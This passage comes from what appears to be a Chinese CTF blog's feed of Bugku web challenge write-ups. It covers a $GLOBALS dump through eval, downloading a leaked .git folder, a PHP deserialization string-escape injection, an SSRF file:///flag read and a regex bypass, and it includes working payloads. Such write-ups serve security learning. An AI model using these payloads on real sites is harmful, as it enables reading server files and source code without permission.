<p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\localhost2.php.png" alt="localhost2.php"></p>
<ol start="6">
<li>用输出iv的值替换cookies里的iv</li>
</ol>
<p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\flag.png" alt="flag"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web9</title>
    <url>/2021/03/30/bugku-web9/</url>
    <content><![CDATA[<pre><code>flag In the variable ! &lt;?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?&gt; </code></pre>
<p>flag in the variable 就说了flag在变量中<br>error_reporting(0); 关闭报错提示<br>include “flag1.php”; 此时引入flag1的代码<br>highlight_file(<em>file</em>); 高亮显示<br>if(isset($_GET[‘args’])) 条件判断 get方法传递的args参数是否存在<br>若存在然后赋值<br>preg_match() 函数 — 执行匹配正则表达式<br>/^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$/结尾<br>die(“args error!”); 输出 args error!<br>eval(“var_dump($$args);”); 将字符串作为php代码执行结尾加分号<br>var_dump()函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与<br>值。数组将递归展开值，通过缩进显示其结构。</p>
<p>$$args 可以理解为$($args)</p>
<p>eval()函数存在命令执行漏洞.</p>
<p>flag In the variable 就说了flag在变量中，所以我们想办法用命令输出变量即可，我们想到构造 php中超全局变量 $GLOBALS<br>PHP 在名为 $GLOBALS[index]* 的数组中存储了所有全局变量。变量的名字就是数组的键。*<br>即 .php?args=GLOBALS</p>
<p>eval(“var_dump($$args);”);    </p>
<pre><code>1</code></pre>
<p>首先将 var_dump($$args); 当成代码执行 var_dump($GLOBALS);</p>
<p>var_dump()函数将$GLOBALS数组中存放的所有变量以数组的方式输出 得到flag。<br><img src="/2021/03/30/bugku-web9/blog/source_posts\Bugku：Web9\1.png" alt="1"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web40-git泄露</title>
    <url>/2021/04/14/bugku-web40-git-xie-lu/</url>
    <content><![CDATA[<h2 id="git信息泄露漏洞"><a href="#git信息泄露漏洞" class="headerlink" title="git信息泄露漏洞"></a>git信息泄露漏洞</h2><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>攻击者可以利用该漏洞下载git文件夹里的所有内容。如果文件夹内有敏感信息比如站点源码、数据库账户密码等，攻击者可能直接控制服务器。</p>
<h3 id="Git介绍"><a href="#Git介绍" class="headerlink" title="Git介绍"></a>Git介绍</h3><p>Git作为大家熟悉的，深受欢迎的版本控制工具，和其他同类工具有很多不同之处：</p>
<ul>
<li>Git始终保存快照而不是文件差异。</li>
<li>任何数据存储前始终使用SHA-1计算校验和，保证内容完整性。</li>
<li>使用分布式仓库设计，让大多数操作都在本地进行，保证了使用效率。几乎所有操作都是向数据库增加数据，提交之后就很难丢失数据。它的本质更像一个内容寻址（content-addressable）文件系统，并在此之上提供了一个版本控制系统的用户界面。</li>
</ul>
<p>Git 有三种状态，你的文件可能处于其中之一：已修改（modified）、已暂存（staged）、已提交（committed）。由此引出三个逻辑区域，他们和文件状态以及部分对应操作的关系如下图。<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\git介绍.png" alt="git介绍"></p>
<p>Git对象<br>在Git系统中有四中类型的对象，所有的Git操作都是基于这四种类型的对象。</p>
<ul>
<li><p>“blob”，这种对象用来保存文件的内容。</p>
</li>
<li><p>“tree”，可以理解成一个对象关系树，它管理一些”tree”和“blob”对象。</p>
</li>
<li><p>“commit”，指向一个”tree”，它用来标记项目某一个特定时间点的状态。它包括以下关于时间点的元数据，如时间戳、最近一次提交的作者、指向上次提交、</p>
</li>
<li><p>“tag”，给某个提交增添一个标记。</p>
<p>git对象之间的个关系如下图</p>
<p><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\Git对象.png" alt="Git对象"></p>
</li>
</ul>
<h4 id="SHA1哈希值"><a href="#SHA1哈希值" class="headerlink" title="SHA1哈希值"></a>SHA1哈希值</h4><p>在Git系统中，每个Git对象都通过哈希值来代表这个对象。哈希值是通过SHA1算法计算出来的，长度为40个字符（40-digit）。</p>
<h4 id="git目录"><a href="#git目录" class="headerlink" title=".git目录"></a>.git目录</h4><ul>
<li>config - 包含一些配置选项</li>
<li>description - 仓库的描述信息，主要给gitweb等git托管系统使用</li>
<li>HEAD - 指定当前分支,映射到ref引用，能够找到下一次commit的前一次哈希值</li>
<li>hooks - 存放可在某些指令前后触发运行的钩子脚本（hook scripts），默认包含一些脚本样例</li>
<li>index - 这个文件就是我们前面提到的暂存区（stage），是一个二进制文件</li>
<li>info - 存放仓库的信息</li>
<li>objects - 存储所有Git的数据对象,对象的SHA1哈希值的前两位是文件夹名称，后38位作为对象文件名</li>
<li>refs - 存储各个分支指向的目标提交</li>
<li>branches - 还没发现有什么用处</li>
</ul>
<h3 id="Git基本操作"><a href="#Git基本操作" class="headerlink" title="Git基本操作"></a>Git基本操作</h3><p>对照这张图来理解两段提交，工作区(working tree)，暂存区（stage/index）和 branch之间的关系<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\git基本操作.png" alt="git基本操作"></p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令:"></a>常用命令:</h3><ul>
<li><p>git ls-files -u显示冲突的文件，-s是显示标记为冲突已解决的文件</p>
</li>
<li><p>git diff 对比工作区和stage文件的差异</p>
</li>
<li><p>git diff –cached 对比stage和branch之间的差异</p>
</li>
<li><p>git ls-files –stage 检查保存在stage的文件</p>
</li>
<li><p>git log 显示到HEAD所指向的commit为止的所有commit记录 。</p>
</li>
<li><p>git reset HEAD <file></file></p>
</li>
<li><p>git reset –hard HEAD放弃工作区和index的改动,HEAD指针仍然指向当前的commit.</p>
<h3 id="实际操作流程"><a href="#实际操作流程" class="headerlink" title="实际操作流程"></a>实际操作流程</h3></li>
</ul>
<h4 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h4><p>此命令初始化一个新本地仓库，它在工作目录下数据目录生成一个名为.git的隐藏文件夹。git会将所有的文件，目录，提交等转化为git对象，压缩存储在这个文件夹当中。<br>git init 命令后面不加参数表示把当前目录变为仓库,如下表示在当前目录下创建test仓库<br>![git init](D:\blog\source_posts\Bugku：Web40-git泄露\git init.png)</p>
<h4 id="git-add"><a href="#git-add" class="headerlink" title="git add"></a>git add</h4><p>创建一个test1.txt文件，git status查看当前状态,此时test.txt文件位于工作目录<br>![git add](D:\blog\source_posts\Bugku：Web40-git泄露\git add.png)<br>通过git add跟踪这个文件,把test.txt文件放到暂存区.(可以使用git rm –cached命令来取消暂存)<br>![git rm –cached](D:\blog\source_posts\Bugku：Web40-git泄露\git rm –cached.png)</p>
<h4 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h4><p>在暂存区的文件使用git commit提交到版本库(数据目录)中<br>-m参数表示提交的注释,如果不使用-m参数那么会跳出页面提示主动输入注释<br>![git commit](D:\blog\source_posts\Bugku：Web40-git泄露\git commit.png)<br>修改test.txt文件<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\修改text文件.png" alt="修改text文件"></p>
<p>修改后，通过查看git status可以看到文件状态被改变了。根据提示知道文件已被修改，但是未提交修改到版本库中。<br>![git status](D:\blog\source_posts\Bugku：Web40-git泄露\git status.png)</p>
<p>git diff,对比工作区和暂存区文件的差异,查看文件被修改的地方<br>![git diff](D:\blog\source_posts\Bugku：Web40-git泄露\git diff.png)</p>
<p>确认修改无误后提交到版本库的方法和提交初始文件一样,需要先提交到暂存区,然后提交到版本库.<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\提交到版本库.png" alt="提交到版本库"><br>再修改一次文件<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\再修改一次文件.png" alt="再修改一次文件"></p>
<p>提交<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\提交.png" alt="提交"><br>git log 查看下历史记录,HEAD我的理解就是指针,指到最后提交的版本<br>![git log](D:\blog\source_posts\Bugku：Web40-git泄露\git log.png)<br>git reset –hard,回退版本<br>回退到上一个版本,gei reset –hard HEAD^<br>![git reset –hard](D:\blog\source_posts\Bugku：Web40-git泄露\git reset –hard.png)</p>
<p>厉害了,可以看到HEAD指针也指到了第一次修改的版本,第二次修改的版本看不到了<br>但是我要是因为操作失误怎么追回地二次修改的版本呢,可以使用git reset –hard 版本号追回<br>git reflog获取版本号,得到第二次修改版本号为5edcc89<br>![git reflog](D:\blog\source_posts\Bugku：Web40-git泄露\git reflog.png)</p>
<p>get reset –hard 5edcc89恢复<br>![get reset –hard 5edcc89](D:\blog\source_posts\Bugku：Web40-git泄露\get reset –hard 5edcc89.png)</p>
<p>我后面测试使用comit后面一串很长的字符,这里理解为对象sha1字符串吧.也可以回退到那个版本</p>
<p><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\回退到那个版本.png" alt="回退到那个版本"></p>
<p>可以把工作区修改的文件git add提交到暂存区，也可以使用git checkout — test1.txt 把工作区的修改撤销，这样，文件就会回退到上一次提交时的状态。<br>![git checkout — test1.txt](D:\blog\source_posts\Bugku：Web40-git泄露\git checkout — test1.txt.png)</p>
<h3 id="Git信息泄露原理"><a href="#Git信息泄露原理" class="headerlink" title="Git信息泄露原理"></a>Git信息泄露原理</h3><ul>
<li>通过泄露的.git文件夹下的文件，还原重建工程源代码</li>
<li>解析.git/index文件，找到工程中所有的（文件名，文件sha1）</li>
<li>去.git/objects文件夹下下载对应的文件</li>
<li>zlib解压文件，按原始的目录结构写入源代码<br>（危害：渗透测试人员、攻击者，可以进一步代码审计，挖掘：文件上传，sql注入等安全漏洞）</li>
</ul>
<h3 id="GitHack工具使用"><a href="#GitHack工具使用" class="headerlink" title="GitHack工具使用"></a>GitHack工具使用</h3><p>GitHack会按照上面的原理自动恢复<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugku：Web40-git泄露\GitHack工具使用.png" alt="GitHack工具使用"></p>
<h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><p>发现有/.git/目录，应该是git泄露了。</p>
<p>wget -r <a href="http://ip_address/.git">http://ip_address/.git</a>　　:递归下载该网站目录下的文件及文件夹</p>
<p>之后进入文件夹使用</p>
<p>git reflog:查看执行的命令日志</p>
<p><a href="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121170625249-528964650.png"><img src="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121170625249-528964650.png" alt="img"></a></p>
<p> 看到flag is here？那就只能一个一个试了，试了第二个的时候，找到了</p>
<p>使用git show commit_id 命令查看commit</p>
<p><a href="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121171515615-627590262.png"><img src="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121171515615-627590262.png" alt="img"></a></p>
<p>参考：<a href="https://www.cnblogs.com/tac2664/p/14309112.html">https://www.cnblogs.com/tac2664/p/14309112.html</a></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku：newphp</title>
    <url>/2021/10/29/bugku-newphp/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">// php版本:5.4.44</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$hint</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span><span class="token operator">===</span><span class="token string">"hint.php"</span><span class="token punctuation">)</span>
            @<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">!=</span> <span class="token string">"╭(●｀∀´●)╯"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            <span class="token comment" spellcheck="true">//There's a hint in ./hint.php</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string">"╰(●’◡’●)╮"</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">User</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>
    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag/is'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NoNoNo!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>unserialize触发<code>__wakeup()</code>魔术方法：</p>
<pre class=" language-php"><code class="language-php"> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">!=</span> <span class="token string">"╭(●｀∀´●)╯"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            <span class="token comment" spellcheck="true">//There's a hint in ./hint.php</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string">"╰(●’◡’●)╮"</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
    <span class="token punctuation">}</span></code></pre>
<p>显然这里会使<code>this-&gt;hint = "╰(●’◡’●)╮"</code>，所以要绕过<code>__wakeup()</code></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">evil</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token string">"hint.php"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><img src="/2021/10/29/bugku-newphp/image-20211029203243929.png" alt="image-20211029203243929"></p>
<p><strong>payload:</strong></p>
<pre><code>O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}</code></pre>
<p>实例化后就会触发<code>__condtruct</code>和<code>__destruct</code>魔术方法</p>
<p><code>__destruct</code>有危险函数<code>file_get_contents</code>利用点</p>
<p><code>unserialize(read(write($a)));</code>调用read和write函数，就有可能出现反序列化字符串逃逸</p>
<h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><p><strong>payload:</strong></p>
<pre><code>username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=1";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}</code></pre>
<p><strong>序列化字符串：</strong></p>
<pre><code>O:4:"User":2:{s:8:"username";s:48:"********";s:8:"password";s:44:"1";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}";}</code></pre>
<p>它的username键值</p>
<pre><code>********";s:8:"password";s:44:"1";O:4:"evil":2:{</code></pre>
<p>从而使hint指向hint.php</p>
<h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p><strong>payload：</strong></p>
<pre><code>username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=1";s:8:"password";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}}</code></pre>
<p><strong>序列化字符串：</strong></p>
<pre><code>O:4:"User":2:{s:8:"username";s:48:"********";s:8:"password";s:60:"1";s:8:"password";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}}";}</code></pre>
<p>username键值：</p>
<pre><code>********";s:8:"password";s:60:"1";s:8:"password</code></pre>
<p>从而使evil类包含hint-&gt;hint.php</p>
<p>调用file_get_contents</p>
<p>base64解码<code>index.cgi</code></p>
<pre><code>{
  "args": {
    "name": "Bob"
  }, 
  "headers": {
    "Accept": "*/*", 
    "Host": "httpbin.org", 
    "User-Agent": "curl/7.64.0", 
    "X-Amzn-Trace-Id": "Root=1-60cc5790-4d6de1ed0d4813ab786ed249"
  }, 
  "origin": "114.67.246.176", 
  "url": "http://httpbin.org/get?name=Bob"
}</code></pre>
<p>可能有ssrf</p>
<p>小trick</p>
<p>知道ssrf存在然后就可以通过file协议来直接读取flag了</p>
<p>payload：?name= file:///flag</p>
<p>重点在反序列化上可以看：</p>
<p><a href="https://www.cnblogs.com/c0d1/p/14900076.html">https://www.cnblogs.com/c0d1/p/14900076.html</a></p>
<p><a href="https://blog.csdn.net/m0_58189778/article/details/119793044">https://blog.csdn.net/m0_58189778/article/details/119793044</a></p>
<p>网上找的反序列化字符串逃逸测试环境：</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#参考字节脉搏实验室</span>
<span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">lemon</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$lemon</span> <span class="token operator">=</span> <span class="token string">'/p/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$lemon</span><span class="token punctuation">,</span><span class="token string">'ww'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">'20'</span><span class="token punctuation">;</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">lemon</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><a href="https://blog.csdn.net/qq_43431158/article/details/108210822">https://blog.csdn.net/qq_43431158/article/details/108210822</a></p>
]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:web-regex</title>
    <url>/2021/04/16/bugku-web-regex/</url>
    <content><![CDATA[<pre><code>&lt;?php 
error_reporting(0);
$zero=$_REQUEST['zero'];
$first=$_REQUEST['first']; 
$second=$zero.$first; if(preg_match_all("/Yeedo|wants|a|girl|friend|or|a|flag/i",$second)){                $key=$second;   
   if(preg_match("/\.\.|flag/",$key)){    
       die("Noooood hacker!");   
   }else{     
       $third=$first;     
       if(preg_match("/\\|\056\160\150\x70/i",$third)){       
            $end=substr($third,5);      
             highlight_file(base64_decode($zero).$end);//maybe flag in flag.php   
          }  
      } 
 } else{ 
 highlight_file(__FILE__);
 } </code></pre>
<p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\regex1.png" alt="regex1"></p>
<p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\regex2.png" alt="regex2"></p>
<p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\flag.png" alt="flag"></p>
<p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\regex1.png" alt="regex1"></p>
<p>我现在就直接解释下当时构造payload的思路的：<br>seconde里要存在”/Yeedo|wants|a|girl|friend|or|a|flag/i”，而second=zero.first，所以zero=flag</p>
<p>key=second=zero.first，并且不能存在”/..|flag/“，也就是说zero不能=flag，但可以看下面highlight_file(base64_decode($zero).$end)，会进行base64_decode，所以直接将’flag’进行base64加密得到ZmxhZw==</p>
<p>之后third=first，并且要匹配”/\|\056\160\150\x70/i”，这是16进制与进制的东西，转换成10进制，再转成ascii码后即为|.php，但$end=substr($third,5);，故需要在|.php前面加上4个字符，来绕过substr，不过这4个字符得都是”/Yeedo|wants|a|girl|friend|or|a|flag/i”，这里面的（我这里给出一些字符:aaaa oror Flag girl ）这里用Flag的原因是不能匹配/..|flag/，所以完整的payload为：</p>
<pre><code>?zero=ZmxhZw==&amp;first=aaaa|.php</code></pre>
<p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugku：web-regex\flag.png" alt="flag"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku：noteasytrick</title>
    <url>/2021/10/28/bugku-noteasytrick/</url>
    <content><![CDATA[<h5 id="php利用ZipArchive类操作文件的实例"><a href="#php利用ZipArchive类操作文件的实例" class="headerlink" title="php利用ZipArchive类操作文件的实例"></a>php利用ZipArchive类操作文件的实例</h5><p><a href="https://www.jb51.net/article/179039.htm">https://www.jb51.net/article/179039.htm</a></p>
<h5 id="fastcoll工具"><a href="#fastcoll工具" class="headerlink" title="fastcoll工具"></a>fastcoll工具</h5><p><a href="https://www.zeroplace.cn/article.asp?id=886">https://www.zeroplace.cn/article.asp?id=886</a></p>
<h1 id="noteasytrick"><a href="#noteasytrick" class="headerlink" title="noteasytrick"></a>noteasytrick</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span><span class="token string">"Off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Jesen</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$me</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">me</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
